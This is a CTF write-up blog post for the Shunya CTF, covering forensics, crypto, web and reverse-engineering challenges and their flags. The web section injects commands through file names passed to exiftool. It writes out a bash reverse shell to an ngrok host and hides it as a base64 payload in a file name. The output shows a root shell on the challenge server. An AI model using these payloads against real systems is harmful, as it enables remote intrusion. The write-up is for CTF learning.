---
layout: post
title:  "shunya ctf"
date:   2024-04-14 09:29:20 +0700
categories: shunya ctf
usemathjax: true
---
## BIBBA 1/Forensics
- description
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/d2871924-ee53-45bc-9df3-26557a5ab988)
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/c2859581-b48a-4317-9801-a273deb5e4ce)
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/effaaff9-393d-4d87-8381-d55bff37ea7c)
0CTF{pNg_h34d3rs_4r3_A_P4!n_P4!n_!n_7h3_455}
## sanity check
- description
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/983bd774-9124-4545-a014-a3422392669e)
- go to the source code and search for "0CTF"
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/db927e03-bb29-4d6c-8126-63ddf0d56930)
0CTF{0ut_0f_B0unds}
## echoes of encryption/crypto
- description
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/f09f6cda-98e8-4ed4-b3bf-fe524ada90b4)
- encrypt.py
```
import random
import string
def encrypt_string(input_string, seed):
    random.seed(seed)   
    allowed_chars = string.ascii_letters + string.digits
    key = ''.join(random.choices(allowed_chars, k=len(input_string)))
    encrypted_string = ''
    for i in range(len(input_string)):
        encrypted_char = chr(ord(input_string[i]) ^ ord(key[i]))
        encrypted_string += encrypted_char
    return encrypted_string.encode().hex()
seed_value = '311222'
input_string = ""
encrypted = encrypt_string(input_string, seed_value)
```
- cipher
```
5e04610a22042638723c571e1a5436142764061f39176b4414204636251072220a35583a60234d2d28082b
```
- decrypt.py
```
import random
import string
#seed1='CVE-2022-42269'
#seed1='202242269'
#seed1='CVE-2022-42269'
#seed1=7.9
seed1=202242269
random.seed(seed1)
allowed_chars = string.ascii_letters + string.digits
key = ''.join(random.choices(allowed_chars, k=43))
# print("key si ",key,"len is ",len(key))
c='5e04610a22042638723c571e1a5436142764061f39176b4414204636251072220a35583a60234d2d28082b'
#after applying bytes.fromhex()
value1=bytes.fromhex(c)
#after decodig to asci from bytes
value2=value1.decode()
# print("value2 is ",value2,"len is ",len(value2))#43
ans=''
for i in range(len(value2)):
    x=chr(ord(value2[i])^ord(key[i]))
    ans=ans+x
# print("ans is ",ans)
# print("rev is ",ans[::-1])
print("ans ",ans)
```
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/8d3cfc3a-63f9-46c7-9219-f1446ab9be83)
- 0CTF{alw4y5_r3ad_7he_d3scr!pti0n_c4r3fully}
## Data's Data/web
- description
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/d5c96849-aec8-4582-941e-ad7d39975e82)
- frontend
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/4053f72d-236c-45d1-b839-6f02e34505cc)
- it runs exiftool on the provided file
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/1416894e-d4e4-48b2-9515-a2fa058815cc)
- so it is could be like `exiftool filename.extension`
- so if this is the case we can try to execute commands(cmd injection)
- IFS -internal field seperator
### making malicious file names
1:try id
```
C:\home\radha\Desktop\exiftool> touch '$(id)'                                                                             
C:\home\radha\Desktop\exiftool> ls
'$(id)'
```
- result
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/5d3327b1-a5e4-4ca9-8df3-946c5b61e4b5)
2: try to have a blind cmd execution(sleep?)
```
C:\home\radha\Desktop\exiftool> touch '$(sleep${IFS}10)'                                                                             
C:\home\radha\Desktop\exiftool> ls
'$(id)'  '$(sleep${IFS}10)'
```
- here the `${IFS}` is for a space
- we do get the response only after 10 secnonds from browser web page
### getting reverse shell
- `bash -i >& /dev/tcp/0.tcp.in.ngrok.io/17011 0>&1`
- started a ngrok tcp server at port x(say 1234)  `ngrok tcp 1234`
- started a netcat listner at port x(1234) `nc -lvp 1234`
- the`0.tcp.in.ngrok.io` is part of hostname
- the 18308 is the corresponding port
```
C:\home\radha\Desktop\exiftool> ngrok tcp 1234
```
![image](https://github.com/m0wn1ka/ctf/assets/127676379/423bc5e4-a413-4b29-8906-edebd460f41f)
- the charcters like &> must be encoded
- so i did base64 encoding
- payload of reverse shell
```
C:\home\radha\Desktop\exiftool> echo 'bash -i >& /dev/tcp/0.tcp.in.ngrok.io/17011 0>&1'|base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xNzAxMSAwPiYxCg==
```
- we need this payload to be base64 decoded on the server and get executed
- so we need to run on server like this
```
echo THIS_PAYLOAD |base64 -d|bash
```
- so this must be exeuted on the server side
- just as we executed sleep by $(sleep${IFS}10) we follow a similar approach
```
$(echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xNzAxMSAwPiYxCg'|base64 -d|bash)
$(echo${IFS}'YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xNzAxMSAwPiYxCg'|base64${IFS}-d|bash)
```
- so this must be the name of file

- creatig file
```
touch "$(echo${IFS}'YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xNzAxMSAwPiYxCg'|base64${IFS}-d|bash)"
```
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/38495d4c-354b-480a-8d08-5c141a1350d1)
- rev shell
```
C:\home\radha\Desktop\exiftool> nc -nvlp 1234 
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37650
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@traboda:/# whoami
whoami
root
root@traboda:/# ls
ls
```
- gettgin flag
```
root@traboda:/# cat Do*
cat Do*
FROM python:3.11
WORKDIR /
RUN apt update
RUN apt -y install exiftool
COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt
COPY . .
ENV flag="0CTF{Congratulations_for_finding_the_flag}"
EXPOSE 80
CMD python3 index.pyroot@traboda:/#
```
- 0CTF{Congratulations_for_finding_the_flag}
## one liner/rev
- description
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/641852b0-f608-4b63-a778-ca07fd19e971)
```
flag = "ƃŰŶŉůļźŞŷŭŪƄŰŘŰŧŖŔŦĦŨĬƀźōşŋůĲňĳźĖőƃũťũŸŪĞ"
flag = [~(c^i)*(-int(1/(5**0.5) * ((1 + 5**0.5)**1 / 2 - (1 - 5**0.5)**1 / 2))) + len(flag) * 6 + 15 for i, c in enumerate([ord(a) for a in flag[::-int(1/(5**0.5) * ((1 + 5**0.5)**1 / 2 - (1 - 5**0.5)**1 / 2))]])]
print(tostr(flag))
#  0CTF{___R___E__D___A___C____T_____E____D______}
```
- trying to see the approch
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/bda688ee-7211-45f3-986b-bc4e7c0fb995)
- decrypt.py
```
flag = "ƃŰŶŉůļźŞŷŭŪƄŰŘŰŧŖŔŦĦŨĬƀźōşŋůĲňĳźĖőƃũťũŸŪĞ"
ord_values=[]
for i in flag:
    ord_values.append(ord(i))
new_array=[]
ans=''
for i,x in enumerate(ord_values):
    value1=x-261
    value2=value1*-1
    value3=~(value2)
    value4=value3^i
    new_array.append(value4)
    ans=ans+chr(value4)
print("ans is ",ans[::-1])
```
- output
```
C:\tmp> nano oneliner.py                                                                                                                                                            
C:\tmp> python oneliner.py
ans is  0CTF{@_j0k3_0r_@_cl3v3r_@nd_funny_r3m@rk}                                                                                                                                               
C:\tmp> 
```
- 0CTF{@_j0k3_0r_@_cl3v3r_@nd_funny_r3m@rk}
## score board
![image](https://github.com/m0wn1ka/ctf/assets/127676379/619a4f99-b0f3-46f5-a3b3-eb5413f62e66)
